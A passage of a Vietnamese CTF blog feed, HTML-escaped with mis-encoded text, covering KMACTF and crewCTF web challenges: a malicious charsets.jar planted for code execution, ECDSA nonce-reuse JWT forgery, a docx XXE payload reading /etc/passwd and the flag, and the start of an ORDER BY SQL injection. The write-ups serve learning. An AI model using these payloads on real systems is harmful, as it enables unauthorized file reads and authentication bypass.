&lt;p&gt;Báº¯t Ä‘áº§u tá»« viá»‡c khá»Ÿi táº¡o project má»›i, mÃ¬nh Ä‘á»ƒ tÃªn lÃ  charsets luÃ´n cho tiá»‡n, Ä‘á»“ng thá»i dÃ¹ng jdk 1.8
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BkeesUtiA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i thÆ° má»¥c java mÃ¬nh chá»n new package, vÃ  nháº­p vÃ o package nhÆ° cá»§a author lÃ  &lt;code&gt;sun.nio.cs.ext&lt;/code&gt;:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BJUQsUFi0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡o 2 file Java clss bÃªn trong package vá»«a táº¡o vÃ  copy code vÃ´ :))), riÃªng táº¡i IBM33722.java thÃ¬ mÃ¬nh sáº½ sá»­a cÃ¢u lá»‡nh táº¡o file log, Ä‘á»“ng thá»i thÃªm main method vÃ o (khÃ´ng cÃ³ gÃ¬ khÃ´ng sao):
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/r1AQn8KoC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
ThÃªm folder META-INF vÃ  file &lt;code&gt;MANIFEST.MF&lt;/code&gt; vÃ o bÃªn trong thÆ° má»¥c resource, copy ná»™i dung cá»§a file jar kia vÃ o:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ry5O2UYj0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tiáº¿n hÃ nh compile project nÃ y báº±ng cÃ¡ch cháº¡y nÃ³ thÃ´i, káº¿t quáº£ file class sáº½ náº±m táº¡i folder target:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H10C2IFiR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tiáº¿n hÃ nh Ä‘Ã³ng gÃ³i thÃ nh file JAR táº¡i tab Project Structure, chá»n má»¥c Artifacts vÃ  chá»n táº¡o file JAR:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BJXf6UYsA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i Ä‘Ã¢y thÃ¬ mÃ¬nh khÃ´ng chá»n gÃ¬, vÃ¬ main method cÃ³ cÅ©ng khÃ´ng quan trá»ng láº¯m:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1pmaLtjR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
LÃºc nÃ y file charsets.jar sáº½ chá»©a káº¿t quáº£ output cá»§a compile, Ä‘á»ƒ cháº¯c cháº¯n thÃ¬ mÃ¬nh thÃªm ná»™i dung bÃªn trong folder resource lÃ  folder META-INF Ä‘á»ƒ cháº¯c cÃº:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkT_TLFsA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i tab Build chá»n Build Artifacts, file jar sáº½ Ä‘Æ°á»£c compile
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJWjaUtsA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Kiá»ƒm tra file jar khá»Ÿi táº¡o thÃ¬ nÃ³ Ä‘Ã£ Ä‘áº§y Ä‘á»§ cÃ¡c thÃ nh pháº§n nhÆ° cá»§a file jar máº«u: thÆ° má»¥c chá»©a MANIFEST vÃ  2 file class
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ByNxR8KsR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Náº¿u nhÆ° nhÃ©t file java vÃ o file jar thÃ¬ file jar sáº½ náº·ng khoáº£ng 5KB, cÃ²n khi compile xong thÃ¬ nÃ³ sáº½ lÃ  11KB
MÃ¬nh deploy láº¡i local Ä‘á»ƒ upload file jar má»›i, sau khi láº·p láº¡i cÃ¡c bÆ°á»›c trÃªn thÃ¬ file flag.txt Ä‘Ã£ Ä‘Æ°á»£c khá»Ÿi táº¡o táº¡i /tmp/flag.txt
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SJ6_C8KiC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Káº¿t quáº£ trÃªn instance challenge:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJgTkvYjC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Flag: &lt;strong&gt;KMACTF{ayoooo00oo0ooo0o0o00o0ooooo000oo0oo0o00000}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="not-so-secure"&gt;not so secure
&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Bk8JWDFsR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL: &lt;a class="link" href="http://157.15.86.73:9999/" target="_blank" rel="noopener"
&gt;157.15.86.73:9999&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ÄÃ¢y lÃ  challenge mÃ  mÃ¬nh khÃ´ng ká»‹p lÃ m trong 1 tiáº¿ng cuá»‘i trÆ°á»›c khi cuá»™c thi káº¿t thÃºc, nÃªn mÃ¬nh cÃ³ Ä‘i há»i vá» hÆ°á»›ng lÃ m, tá»« Ä‘Ã³ reproduce láº¡i Ä‘á»ƒ hiá»ƒu hÆ¡n&lt;/p&gt;
&lt;h3 id="bypass-jwt-es256"&gt;Bypass JWT ES256
&lt;/h3&gt;&lt;p&gt;Khi truy cáº­p vÃ o website, ta sáº½ Ä‘Æ°á»£c ghi hero name vÃ  quirk code:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1k1u3YjA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
GiÃ¡ trá»‹ username Ä‘Æ°á»£c ghi vÃ o trong jwt, cÃ²n quirk code thÃ¬ Ä‘iá»n bao nhiá»u thÃ¬ quirk váº«n cÃ³ giÃ¡ trá»‹ lÃ  civilian thÃ´i.
Website thÃ¬ cÃ³ file robots.txt cÃ³ má»™t chÃºt gá»£i Ã½ vá» viá»‡c mÃ£ hÃ³a ES256 diá»…n ra nhÆ° tháº¿ nÃ o:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/S154_ntsA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äi theo gá»£i Ã½, mÃ¬nh tÃ¬m cÃ¡ch crack jwt Ä‘á»ƒ Ä‘Æ°a giÃ¡ trá»‹ cá»§a quirk vá» hero nhÆ°ng khÃ´ng ká»‹p.
Sau Ä‘Ã³ thÃ¬ mÃ¬nh Ä‘Ã£ xin hint cá»§a ngÆ°á»i anh em &lt;a class="link" href="https://hackmd.io/@C4t-f4t" target="_blank" rel="noopener"
&gt;C4t-f4t&lt;/a&gt; vá» hÆ°á»›ng giáº£i vÃ  nháº­n ra cÃ³ script cá»§a 1 bÃ i gáº§n tÆ°Æ¡ng tá»± táº¡i NahamCon 2021 dÃ¹ng Ä‘á»ƒ bypass jwt sá»­ dá»¥ng há»‡ máº­t Ä‘Æ°á»ng cong Eliptic. Lá»— há»•ng xáº£y ra khi sá»­ dá»¥ng thuáº­t toÃ¡n ECDSA mÃ  khÃ´ng thay Ä‘á»•i nonce, attacker cÃ³ thá»ƒ crack ra Ä‘Æ°á»£c private key. Äá»ƒ hiá»ƒu hÆ¡n thÃ¬ mÃ¬nh cÃ³ thá»ƒ tham kháº£o thÃªm táº¡i: &lt;a class="link" href="https://asecuritysite.com/encryption/ecd5" target="_blank" rel="noopener"
&gt;https://asecuritysite.com/encryption/ecd5&lt;/a&gt;
Vá»›i 2 máº«u thÃ´ng Ä‘iá»‡p thÃ¬ mÃ¬nh cÃ³ thá»ƒ crack Ä‘Æ°á»£c secret key vÃ  forge ra Ä‘Æ°á»£c token cá»§a riÃªng mÃ¬nh
Link write up Ä‘Ã³ táº¡i: &lt;a class="link" href="https://github.com/milliesolem/writeups/blob/main/NahamCon%202021/Elliptical/solve.py" target="_blank" rel="noopener"
&gt;https://github.com/milliesolem/writeups/blob/main/NahamCon%202021/Elliptical/solve.py&lt;/a&gt;
MÃ¬nh chá»‰nh sá»­a 1 chÃºt cho phÃ¹ há»£p vá»›i bÃ i vÃ  chÃ¨n vÃ o pháº§n jwt payload&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{&amp;#34;username&amp;#34;:&amp;#34;kev1n&amp;#34;,&amp;#34;quirk&amp;#34;:&amp;#34;hero&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BkguF3Kj0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NhÆ°ng cÃ³ váº» quirk hero lÃ  khÃ´ng Ä‘Ãºng, quirk lÃ  tÃªn gá»i chung cá»§a cÃ¡c siÃªu nÄƒng lá»±c cá»§a máº¥y nhÃ¢n váº­t trong website, nÃªn mÃ¬nh náº£y ra Ã½ Ä‘á»‹nh lÃ  thá»­ vá»›i táº¥t cáº£ cÃ¡c quirk Ä‘Æ°á»£c giá»›i thiá»‡u trÃªn trang web, bao gá»“m:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ONE FOR ALL
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;HALF-COLD HALF-HOT
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;EXPLOSION
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ALL FOR ONE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;DARK SHADOW
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;CREATION
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;HARDENING
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ENGINE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;INVISIBILITY
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;FROG
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ANIVOICE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;HACKING
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Thá»­ Ä‘áº¿n cÃ¡i quirk cuá»‘i cÃ¹ng thÃ¬ mÃ¬nh má»›i tháº¥y route dashboard cÃ³ sá»± khÃ¡c biá»‡t, vÃ  mÃ¬nh cÅ©ng Ä‘á»ƒ Ã½ lÃ  tÃ¡c giáº£ Ä‘Ã£ hint Ä‘á»ƒ thÃ nh quirk nÃ y khi trang web Ä‘á» cáº­p Ä‘áº¿n ngÆ°á»i sá»Ÿ há»¯u quirk HACKING nÃªn liÃªn láº¡c vá»›i há»:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ByJ25hts0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Forge má»™t jwt má»›i, vÃ  giao diá»‡n lÃºc nÃ y Ä‘Ã£ thay Ä‘á»•i, cho phÃ©p ta Ä‘Æ°á»£c upload file docx:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SyGi5htiR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ry2p53YjC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="from-docx-to-xxe"&gt;From docx to XXE
&lt;/h3&gt;&lt;p&gt;Äáº§u tiÃªn mÃ¬nh gá»­i má»™t file docx valid thÃ¬ chÆ°Æ¡ng trÃ¬nh sáº½ Ä‘áº¿m sá»‘ lÆ°á»£ng word cÃ³ trong doc Ä‘á»ƒ hiá»ƒn thá»‹ ra ngoÃ i:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HkdQn2FiA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äi mÃ² máº«m cÃ¡c file xml cÃ³ dÃ¹ng Ä‘á»ƒ khai thÃ¡c thÃ¬ em tÃ¬m Ä‘Æ°á»£c write up nÃ y: &lt;a class="link" href="https://ctftime.org/writeup/24895" target="_blank" rel="noopener"
&gt;https://ctftime.org/writeup/24895&lt;/a&gt;, trong 1 file word sáº½ tá»“n táº¡i cÃ¡c file xml vÃ  thÆ° má»¥c sau:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ryDhu6KsR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NhÆ° váº­y ta cÃ³ thá»ƒ tháº¥y file word thá»±c cháº¥t lÃ  tá»•ng há»£p cá»§a nhiá»u file xml, nÃªn mÃ¬nh cÃ³ thá»ƒ chÃ¨n file xml vÃ o trong file docx Ä‘á»ƒ thá»±c thi XXE.
Trong writeup mÃ¬nh tham kháº£o thÃ¬ há» sá»­ dá»¥ng file docProps/app.xml chá»©a cÃ¡c thÃ´ng sá»‘ vá» file word, cá»¥ thá»ƒ nhÆ° sá»‘ dÃ²ng, sá»‘ chá»¯, sá»‘ trang,&amp;hellip; cá»§a file docx Ä‘Ã³ Ä‘á»ƒ inject vÃ o sá»‘ mÃ  website show ra -&amp;gt; Ä‘Ã³ lÃ  sá»‘ chá»¯ (words)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;!DOCTYPE foo [
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;!ELEMENT foo ANY &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34; &amp;gt;]&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;Properties
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xmlns=&amp;#34;http://schemas.openxmlformats.org/officeDocument/2006/extended-properties&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xmlns:vt=&amp;#34;http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;Template&amp;gt;Normal.dotm&amp;lt;/Template&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;TotalTime&amp;gt;0&amp;lt;/TotalTime&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;Pages&amp;gt;1&amp;lt;/Pages&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;Words&amp;gt;&amp;amp;xxe;&amp;lt;/Words&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;Characters&amp;gt;4&amp;lt;/Characters&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;Application&amp;gt;Microsoft Office Word&amp;lt;/Application&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;DocSecurity&amp;gt;0&amp;lt;/DocSecurity&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;Lines&amp;gt;100&amp;lt;/Lines&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;Paragraphs&amp;gt;1&amp;lt;/Paragraphs&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;ScaleCrop&amp;gt;false&amp;lt;/ScaleCrop&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;Company&amp;gt;Reply&amp;lt;/Company&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;LinksUpToDate&amp;gt;false&amp;lt;/LinksUpToDate&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;CharactersWithSpaces&amp;gt;4000&amp;lt;/CharactersWithSpaces&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;SharedDoc&amp;gt;false&amp;lt;/SharedDoc&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;HyperlinksChanged&amp;gt;false&amp;lt;/HyperlinksChanged&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;AppVersion&amp;gt;16.0000&amp;lt;/AppVersion&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/Properties&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tiáº¿n hÃ nh zip file xml nÃ y vÃ o file docx báº±ng command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;zip a1.docx docProps/app.xml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BJGwtaYoA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Ná»™i dung file Ä‘Ã£ hiá»‡n ra á»Ÿ website
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H10YYTFiC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh sáº½ Ä‘á»c flag báº±ng &lt;code&gt;file:///flag.txt&lt;/code&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkvCK6KiC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Upload file docx vÃ  mÃ¬nh Ä‘Ã£ cÃ³ Ä‘Æ°á»£c flag:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1Qb5aYj0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Flag: &lt;strong&gt;KMACTF{3cd54_n0nc3_r3u53_4774ck_4nd_xx3_up104d}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>crewCTF2024 - BearBurger</title><link>https://kev1n1203.github.io/p/crewctf-2024/</link><pubDate>Mon, 05 Aug 2024 09:47:56 +0000</pubDate><guid>https://kev1n1203.github.io/p/crewctf-2024/</guid><description>&lt;h2 id="preface"&gt;Preface
&lt;/h2&gt;&lt;p&gt;Challenge nÃ y mÃ¬nh ngá»“i lÃ m tá»« Ä‘áº§u giáº£i Ä‘áº¿n cuá»‘i giáº£i nhÆ°ng Ä‘Ã£ khÃ´ng ká»‹p solve, vÃ¬ cay cÃº nÃªn mÃ¬nh sáº½ viáº¿t write up Ä‘á»ƒ lÆ°u láº¡i kiáº¿n thá»©c mÃ¬nh há»c Ä‘Æ°á»£c thÃ´ng qua challenge nÃ y.
Bearburger lÃ  challenge mÃ  tÃ¡c giáº£ custom láº¡i code project Bear Burger Spring Boot táº¡i &lt;a class="link" href="https://github.com/Raofin/BearBurger/" target="_blank" rel="noopener"
&gt;github&lt;/a&gt;. CÃ¡c chá»©c nÄƒng nhÆ° make admin, remove admin Ä‘Ã£ bá»‹ xÃ³a bá», mÃ¬nh cÃ³ thá»ƒ nÃ³i lÃ  1 phiÃªn báº£n tá»‘i giáº£n vÃ  &amp;ldquo;cÃ³ thá»ƒ khai thÃ¡c hÆ¡n&amp;rdquo; tá»« version trÃªn github&lt;/p&gt;
&lt;h2 id="source-code-analysis"&gt;Source code analysis
&lt;/h2&gt;&lt;p&gt;Author tuy Ä‘Æ°a cáº£ file war nhÆ°ng láº¡i khÃ´ng cho file database, nÃªn mÃ¬nh pháº£i Ä‘i tÃ¬m file sql cá»§a src github Ä‘á»ƒ nhÃ©t vÃ o, vÃ  lÆ°u Ã½ khi láº¥y tá»« trÃªn Ä‘Ã³ vá» mÃ¬nh sáº½ cáº§n pháº£i khai bÃ¡o username lÃ  kiá»ƒu varchar(300) cho há»£p lÃ½ vá»›i khai bÃ¡o thuá»™c tÃ­nh Ä‘Ã³ trong model User:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nd"&gt;@Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Username&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;private&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nd"&gt;@NotNull&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nd"&gt;@Size&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;min&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;max&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;300&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id="sql-injection-in-order-by-clause"&gt;SQL Injection in Order By Clause
&lt;/h3&gt;&lt;p&gt;Thoáº¡t Ä‘áº§u mÃ¬nh nhÃ¬n thÃ¬ cÅ©ng spot Ä‘Æ°á»£c ngay chá»— khai thÃ¡c SQL Injection táº¡i endpoint: &lt;code&gt;/api/v1/fetch-foods-by-category/{category}/{sorting}&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
